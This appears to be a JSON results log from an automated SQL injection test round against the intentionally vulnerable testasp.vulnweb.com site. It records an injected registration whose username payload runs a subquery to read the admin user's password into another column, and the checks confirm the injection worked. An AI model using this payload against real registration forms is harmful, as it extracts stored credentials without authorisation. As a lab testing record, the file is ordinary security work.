@@ -1,0 +1,50 @@
+{
+  "round": 13,
+  "requests": 54,
+  "writes": [
+    {
+      "what": "normal registration",
+      "uname": "RT12TEST",
+      "status": 200,
+      "redirect": "http://testasp.vulnweb.com/Login.asp?RetURL="
+    },
+    {
+      "what": "injected registration",
+      "uname_payload": "rt12x', 'p', 'e', 'r', (SELECT TOP 1 upass FROM users WHERE uname='admin'))--",
+      "status": 200,
+      "redirect": "http://testasp.vulnweb.com/Login.asp?RetURL="
+    }
+  ],
+  "checks": {
+    "pre": {
+      "rt12x_exists": false,
+      "rt12test_exists": false,
+      "default_markers": 0,
+      "thread9_posts": 0
+    },
+    "baseline_row_created": true,
+    "injection": {
+      "row_exists": true,
+      "avatar_equals_subquery": true,
+      "email_ok": true,
+      "realname_ok": true,
+      "exactly_one_row": true,
+      "avatar_extracted": "none"
+    },
+    "integrity": {
+      "default_markers": [
+        0,
+        0
+      ],
+      "thread9_posts": [
+        0,
+        0
+      ],
+      "posts_gt_25": false
+    },
+    "control": {
+      "row_exists": true,
+      "avatar_empty": true
+    }
+  }
+}
